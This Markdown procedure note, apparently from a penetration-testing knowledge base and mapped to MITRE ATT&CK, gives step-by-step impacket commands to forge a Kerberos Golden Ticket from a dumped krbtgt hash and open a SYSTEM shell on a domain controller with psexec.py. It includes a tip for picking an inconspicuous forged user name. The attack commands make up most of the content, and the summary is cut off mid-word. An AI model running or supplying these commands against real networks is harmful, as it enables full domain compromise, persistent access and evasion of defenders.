---
id: 3472aad0-5e6e-4bfa-94f2-ddd0b9627324
name: Create a Golden Ticket and Launch a Windows SYSTEM Shell (Linux)
type: procedure
verified: true
submitted: true
created_at: '2020-06-24T05:08:26.349092+00:00'
updated_at: '2023-05-25T19:43:47.435349+00:00'
tactics:
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Pass the Ticket|T1097 - Pass the Ticket]]'
tags:
- '[[Active Directory]]'
- '[[persistence]]'
- '[[shell]]'
commands:
- '[[Create a Golden Ticket with the krbtgt hash]]'
- '[[lookupsid.py Get a Domain SID from the Domain Controller]]'
- '[[psexec.py Spawn a SYSTEM Shell with a Kerberos Ticket]]'
- '[[Set the KRBCCNAME Value to a Local File]]'
- '[[Sync the Local System to a Remote System via Anonymous SMB]]'
---

# Create a Golden Ticket and Launch a Windows SYSTEM Shell (Linux)

**Status**: ✓ Verified

## Summary

Use the domain's krbtgt NTLM hash from a domain controller to create a Golden Ticket, then use it to spawn a SYSTEM shell on a remote system using psexc. The krbtgt hash is generally obtained by gaining Administrator rights on a domain controller and dumping the hash via DCSync (Mimikatz, secretsdu

## Description

# Description

Use the domain's krbtgt NTLM hash from a domain controller to create a Golden Ticket, then use it to spawn a SYSTEM shell on a remote system using psexc. The krbtgt hash is generally obtained by gaining Administrator rights on a domain controller and dumping the hash via DCSync (Mimikatz, secretsdump),  LSA (Mimikatz), or Hashdump (Meterpreter).

# Instructions

1. Get the domain SID from the domain controller

**Command** ([[lookupsid.py Get a Domain SID from the Domain Controller]]):

```bash
lookupsid.py '$_DOMAIN/$_USERNAME:$_PASSWORD'@$_TARGET_IP
```

2. Create a Golden ticket for the Administrator user. The name itself doesn't matter, but "Administrator" stands out less than "hackerman"

**Command** ([[Create a Golden Ticket with the krbtgt hash]]):

```bash
ticketer.py -nthash $_NTLM_HASH -domain-sid $_DOMAIN_SID -domain $_DOMAIN  Administrator
```

3. Set the KRB5CCNAME env var

**Command** ([[Set the KRBCCNAME Value to a Local File]]):

```bash
export KRB5CCNAME="$(pwd)/Administrator.ccache"
```

4. Update the /etc/hosts file, mapping the domain controller FQDN and domain name to the doomain controller's IP. For example:

**Code**: [[10.10.10.5     dc01.bank.local     bank.local]]

5. (Optional) Sync the local system's clock to the domain controller.

**Command** ([[Sync the Local System to a Remote System via Anonymous SMB]]):

```bash
net time set -S $_DC_IP
```

6. Execute psexec with the Kerberos ticket

**Command** ([[psexec.py Spawn a SYSTEM Shell with a Kerberos Ticket]]):

```bash
psexec.py Administrator@$_DC_NAME -k -no-pass -dc-ip $_DC_IP
```

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Pass the Ticket|T1097 - Pass the Ticket]]

## Commands Used

- [[Create a Golden Ticket with the krbtgt hash]]
- [[lookupsid.py Get a Domain SID from the Domain Controller]]
- [[psexec.py Spawn a SYSTEM Shell with a Kerberos Ticket]]
- [[Set the KRBCCNAME Value to a Local File]]
- [[Sync the Local System to a Remote System via Anonymous SMB]]

## Tags

- [[Active Directory]]
- [[persistence]]
- [[shell]]
